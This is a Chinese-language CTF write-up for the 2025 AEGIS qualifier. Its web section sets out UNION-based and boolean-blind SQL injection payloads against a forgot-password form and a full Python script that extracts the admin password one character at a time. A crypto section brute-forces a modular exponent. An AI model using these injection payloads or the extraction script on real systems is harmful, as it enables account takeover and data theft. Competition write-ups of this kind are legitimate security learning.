---
title: 2025 AEGIS神盾盃 初賽
published: 2025-09-28
description: "2025 AEGIS神盾盃 初賽 writeup"
image: "/assets/AEGIS2025/cover.png"
tags: ["CTF Writeup"]
category: "CTF Writeup"
draft: false
---

## **TL;DR**

- **Web — Amnesia Dose (SQLi / Blind boolean + UNION)**  
  題型：Web / SQL injection  
  重點與做法：透過 Forgot Password 的回傳字串判定欄位數與型別，利用 `UNION SELECT` 把資料庫欄位印到回應中（發現第四欄為 email），再用 boolean-based 判斷確認密碼前綴為 `AEGIS{`，最後以 Python requests 寫自動化 brute-force 逐字破解長度為 58 的 password（script 有在文中）。  
  結果：成功取得 admin 密碼（即 flag）。

- **Crypto — random multi (模數算術 / 期望值範圍搜索)**  
  題型：Crypto / 模數運算與搜尋  
  重點與做法：把題目中的數列映成 base=11 的冪次指數，估算總和的期望值與變異數以取得合理的搜尋區間，然後在該區間內對指數 E 做模指數運算與模逆，將結果轉成 bytes。程式使用 `Crypto.Util.number` 及搜尋範圍縮放策略，最終找到 flag 。

![](/assets/AEGIS2025/IMG-20250927190121880.png)

隊伍排名：15 / 40

![](/assets/AEGIS2025/Pasted%20image%2020250927190222.png)

---

我嘗試了幾題，像是 `Key to the orchard` 這題一開始懷疑是不是 Path Traversal 之類的，然後有開 `DirBuster` 去掃掃看，但是掃到一半 `DirBuster` 就卡住了，從掃出來的路徑可以看到各種檔案跟 Apache 版本。  
還有發現 `/admin` 會出現 `Server Error 500` 。  
有去注意過 `/news` 的奇怪文章，因為明明只有六篇，但是 pagination 有十頁。不過 id 改一改數字跟試試看有沒有 SQLi 之後就放著了，我太菜了 (╥﹏╥)

<div style="display: flex; gap: 10px; flex-wrap: wrap;">
  <img src="/assets/AEGIS2025/IMG-20250927190121922.png" style="width: 24%; height: auto;border-radius: 4px;">
  <img src="/assets/AEGIS2025/IMG-20250927190121975.jpg" style="width: 24%; height: auto;border-radius: 4px;">
  <img src="/assets/AEGIS2025/IMG-20250927190122022.png" style="width: 24%; height: auto;border-radius: 4px;">
  <img src="/assets/AEGIS2025/IMG-20250927190122062.png" style="width: 24%; height: auto;border-radius: 4px;">
</div>

還有 `Cipher Restaurant` ，這認真是胡鬧廚房 (｡ŏ_ŏ)  
看到 PRIME 的時候想說有沒有可能是 PRIME 對應的質數 5361234111 就是 passphrase，失敗 (賽後看大佬們討論好像是要把這幾個質數乘起來當 passphrase？)  
當下發現好像有點太通靈了，果斷寫下一題~  
可憐的隊友認真坐牢三小時 ( ×ω× ) ，辛苦了！！！  
看到小當家出現的那一刻很懵，但沒想到最大的問題出在泡芙阿姨，又學到一個新的隱寫術工具 `OpenPuff` ，真好

<div style="display: flex; gap: 10px; flex-wrap: wrap;">
  <img src="/assets/AEGIS2025/Y.jpg" style="width: 45%; height: auto; border-radius: 4px;">
  <img src="/assets/AEGIS2025/X.jpg" style="width: 45%; height: auto; border-radius: 4px;">
</div>

寫 writeup 的時候才發現，泡芙阿姨那一張右下角是不是有 Gemini 的創作痕跡 www

---

# 2025 AEGIS 神盾盃 初賽

## Web

### Amnesia Dose

事情是這樣的，`Key to the orchard` 寫一半寫不下去了，然後已經解完幾題的海獺說這題是 SQLi (是大電神 🛐)，就來寫 Web 了

首先看到 user login，但現在甚麼線索都沒有，直接去看看 `Forget Password`

![](/assets/AEGIS2025/IMG-20250927190122101.png)

第一個想到的是 `admin` ，按下 `Retrieve Password` 發現會顯示 `I have sent the password to a****@***********` ，猜測在使用者存在的情況下 `@` 前面應該是輸入的使用者名稱

![](/assets/AEGIS2025/IMG-20250927190122141.png)

先試試看有哪些欄位，`' UNION SELECT NULL, NULL, NULL, NULL -- ` 發現會顯示 email 格式錯誤，表示這個表格一共有四個欄位，並且嘗試 `' UNION SELECT '', '', '', 'test@email.com' -- ` 後發現第四個欄位是 email。  
由於前面送出後顯示的是 email，那有沒有可能利用 UNION 在前端顯示出 admin 的密碼呢？

```SQL
' UNION SELECT '', '', '', (SELECT printf('%s@x.com', password) FROM users LIMIT 1) --
```

成功把 admin 的 password 印出來了，也知道這個密碼有 58 位  
看到大寫 A 有點懷疑是不是 flag

![](/assets/AEGIS2025/IMG-20250927190122178.png)  
~~有點想把 email 改成自己的真實 email~~，但一想到後台會看到甚麼就覺得還是算了 w  
試試看 password 是不是就是 flag，如果是，那顯示的 email 開頭會是 t ，反之，email 開頭會顯示 f

```SQL
' UNION SELECT '', '', '', (
  CASE WHEN EXISTS(
    SELECT 1 FROM users
    WHERE username = 'admin' AND substr(password,1,6) = 'AEGIS{'
  ) THEN 'true@x.com' ELSE 'false@x.com' END
) --
```

email 開頭顯示 t ，確定 brute force 出 password 就等於拿到了 flag

![](/assets/AEGIS2025/IMG-20250927190122226.png)

接下來就去 brute force password，請 ChatGPT 幫我生 script

```python
import requests
import time
import urllib.parse

# ---------- 設定區 ----------
URL = "https://aegis2025-amnesia.chals.io/forgot_password"
PARAM_NAME = "username"
HTTP_METHOD = "POST"
TRUE_INDICATOR = "I have sent the password to t"
USE_URLENCODE = False
PRINT_RESPONSE_CHARS = 5000
DELAY = 0.15
REQUEST_TIMEOUT = 10.0

HEADERS = {"User-Agent": "Mozilla/5.0 (ctf-debug)"}
COOKIES = {}
# --------------------------------

# PAYLOAD_TEMPLATE: 每次驗證整段字串
PAYLOAD_TEMPLATE = ("' UNION SELECT '', '', '', (CASE WHEN EXISTS(SELECT 1 FROM users WHERE username='admin' AND substr(password,1,{found_length}) = '{found_and_test_ch}') THEN 'true@x.com' ELSE 'false@x.com' END) -- ")

CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!@.-"
MAX_LEN = 58
session = requests.Session()
session.headers.update(HEADERS)
if COOKIES:
    session.cookies.update(COOKIES)

def send_debug(payload_value):
    data = {PARAM_NAME: payload_value}
    try:
        if HTTP_METHOD.upper() == "GET":
            r = session.get(URL, params=data, timeout=REQUEST_TIMEOUT)
            effective_payload = r.request.path_url
        else:
            r = session.post(URL, data=data, timeout=REQUEST_TIMEOUT)
            effective_payload = r.request.body
    except requests.RequestException as e:
        print("Request failed:", e)
        return None, None, None

    text = r.text or ""
    contains = TRUE_INDICATOR in text
    snippet = text[:PRINT_RESPONSE_CHARS].replace("\n", "\\n")
    return contains, r.status_code, (effective_payload, snippet)

def send_payload_and_debug(payload):
    """helper: 實際送出並印出 debug 資訊"""
    if USE_URLENCODE:
        payload_to_send = urllib.parse.quote_plus(payload)
    else:
        payload_to_send = payload
    found, status, (sent_body, snippet) = send_debug(payload_to_send)
    print("----")
    print(f"PAYLOAD SENT (param={PARAM_NAME}): {payload_to_send}")
    print("HTTP status:", status)
    print("Request body/url:", sent_body)
    print("Response snippet:", snippet)
    print(f"Contains TRUE_INDICATOR('{TRUE_INDICATOR}')? -> {found}")
    return found

def check_prefix(prefix):
    """檢查 password 的前 len(prefix) 個字元是否等於 prefix"""
    safe_prefix = prefix.replace("'", "''")
    payload = PAYLOAD_TEMPLATE.format(
        found_length=len(prefix),
        found_and_test_ch=safe_prefix
    )
    return send_payload_and_debug(payload)

def brute_force_from_prefix(prefix="", max_len=MAX_LEN):
    """從已知 prefix 開始逐位 brute-force"""
    found = prefix
    start_pos = len(prefix) + 1
    print(f"[+] start brute from prefix: '{prefix}', starting at position {start_pos}")

    for pos in range(start_pos, max_len + 1):
        print(f"[+] 測試位置 {pos} ...")
        char_found = None
        for ch in CHARSET:
            test_str = found + ch
            payload = PAYLOAD_TEMPLATE.format(
                found_length=len(test_str),
                found_and_test_ch=test_str
            )
            ok = send_payload_and_debug(payload)
            if ok is None:
                print(" request failed, retrying...")
                time.sleep(1)
                ok = send_payload_and_debug(payload)
                if ok is None:
                    print(" skip this char")
                    continue
            if ok:
                found += ch
                char_found = ch
                print(f"找到字元: '{ch}' -> current prefix: {found}")
                break
            time.sleep(DELAY)
        if char_found is None:
            print(f"[!] 位置 {pos} 無法找到字元，可能到達密碼結尾或 CHARSET 不完整。停止 brute-force。")
            break
    return found

def debug_probe_static():
    probe = "' UNION SELECT 'a','b','c','probe@x.com' -- "
    if USE_URLENCODE:
        probe = urllib.parse.quote_plus(probe)
    ok, status, (sent, snippet) = send_debug(probe)
    print("=== Static probe ===")
    print("Sent:", probe)
    print("Status:", status)
    print("Response snippet:", snippet)
    print("Contains TRUE_INDICATOR? ->", TRUE_INDICATOR in (snippet or ""))
    print("=====================")
    return TRUE_INDICATOR in (snippet or "")

if __name__ == "__main__":
    print("1) static probe...")
    base_ok = debug_probe_static()
    if not base_ok:
        print("注意：static probe 沒找到 TRUE_INDICATOR，請確認 TRUE_INDICATOR 是否正確或使用 probe@x.com 作為 indicator。")

    known_prefix = "AEGIS{"
    if known_prefix:
        print(f"\n2) 檢查已知前綴: {known_prefix}")
        ok = check_prefix(known_prefix)
        print("check_prefix result:", ok)

    print("\n3) 從已知 prefix 繼續逐位 brute-force ...")
    result = brute_force_from_prefix(prefix=known_prefix, max_len=MAX_LEN)
    print("\nResult:", result)
```

中間還被 ChatGPT 坑了一次，它把我的 payload 改掉了，花了一點時間去 debug  
script 跑下去之後，就~~跑去買手搖杯了~~ 🧋  
然後就拿到 flag 了~

![](/assets/AEGIS2025/IMG-20250927190122273.png)

![](/assets/AEGIS2025/IMG-20250927190122311.png)

```txt
AEGIS{y0u_mu57_m4k3_m0r3_u53_0f_un10n_4ll_53l3c7_a3c4a8a7}
```

## Crypto

### random multi

~~沒有很想寫 Crypto 所以給 Chatgpt 讀題目~~，我超爛 QQ

總之 Chatgpt 的意思就是：  
pool 裡的數都是 11 的不同冪（或 1），因此整個隨機乘法生成的 a 可以寫成 11^E（mod p），E 是選到各冪的指數總和。每次從 pool 選一個冪次視為一個隨機變數，E 是 n 次獨立抽樣的總和；依中央極限定理，E 會集中在期望值 mean_total 附近（± 幾個標準差）。  
先計算單次期望與變異數，得到 mean_total 與 std_total；在 mean_total ± R 的範圍內窄幅暴力搜尋候選 E。對每個 E 計算 a = 11^E mod p，取 a 的模逆 a^{-1}，然後 flag_long = c \* a^{-1} mod p，再轉成 bytes 並檢查是否像可讀 flag 。  
--> 利用機率分布把搜尋空間縮小到集中區間

上學期剛死去的記憶正在攻擊我 w

```python
from Crypto.Util.number import long_to_bytes, inverse
import math
from tqdm import tqdm

p = 10270690747750681275848519156345460292282442776941950362299330027993038338823977542405725333740052688659124663537769686180834450426957439995949108234020121
c = 6211227177504225821131033803784639291621321097309823976872498717139250997486591939973272963659554090619408357034740836341244321284116105064793564676501364

pool = [11, 11, 2357947691, 19487171, 1, 1, 1, 1, 2357947691, 14641, 14641, 14641,11, 14641, 214358881, 214358881, 14641, 1, 1771561, 14641, 214358881, 19487171,11, 214358881, 14641, 121, 11, 14641, 161051, 161051, 1331, 161051, 11, 14641,19487171, 214358881, 19487171, 121, 19487171, 1, 1331, 161051, 19487171, 19487171,161051, 161051, 2357947691, 2357947691, 11, 1331, 14641, 11, 11, 19487171, 161051]

# map each pool value -> exponent of base 11 (all pool values are 11^k or 1)
exp_map = {1:0, 11:1, 121:2, 1331:3, 14641:4, 161051:5, 1771561:6, 19487171:7, 214358881:8, 2357947691:9}
exps = [exp_map[x] for x in pool]

# parameters
n = 7691640804

# 計算單次期望值與變異數（用來估計總和的分布）
mean_single = sum(exps)/len(exps)
var_single = sum((e-mean_single)**2 for e in exps)/len(exps)
mean_total = mean_single * n
std_total = math.sqrt(var_single * n)

print("單次期望 (mean_single) =", mean_single)
print("總期望 (mean_total) ≈", int(mean_total))
print("總 sigma (std_total) ≈", int(std_total))

# 搜尋範圍參數
# 從 mean_total - R 到 mean_total + R 嘗試
# 初始 R = 1_000_000
R = 1_000_000

start = int(mean_total) - R
end   = int(mean_total) + R

print(f"搜尋範圍 E ∈ [{start}, {end}] （共 {end-start+1} 項）")

def looks_like_flag(b: bytes) -> bool:
    try:
        s = b.decode('utf-8')
    except:
        return False
    printable = sum(1 for ch in s if 32 <= ord(ch) < 127)
    if printable < 0.8 * len(s):
        return False
    if "flag" in s.lower() or "CTF" in s or "{" in s and "}" in s:
        return True
    if len(s) <= 100 and all(32 <= ord(ch) < 127 for ch in s):
        return True
    return False

found = []
base = 11
mod = p
inv_cache = {}  # optional cache for inverses (not necessary here)
for E in tqdm(range(start, end+1)):
    a = pow(base, E, mod)
    try:
        a_inv = inverse(a, mod)
    except ValueError:
        continue
    flag_long = (c * a_inv) % mod
    try:
        flag_bytes = long_to_bytes(flag_long)
    except Exception:
        continue
    if len(flag_bytes) == 0:
        continue
    if looks_like_flag(flag_bytes):
        s = flag_bytes
        print("---- FOUND candidate ----")
        print("E =", E)
        print(s)
        found.append((E, s))

if not found:
    print("在設定範圍內未找到 flag。")
else:
    print("可能的結果數量：", len(found))
    for E, s in found:
        print("E =", E, "->", s)
```

我原本做好跟 ChatGPT 吵架的準備了，但成功得到 flag

![](/assets/AEGIS2025/IMG-20250927190122353.png)

```txt
AEGIS{1f_y0u_kn0w_1094217hm_1094217hm_w111_h31p_y0u}
```

---

這次還是有一種「別鬧了回家吧」的無力感 (╥﹏╥)  
加上最近又特別忙，蠻容易破防的(?)  
好累，整理完 writeup 再休息  
下次...應該會繼續吧
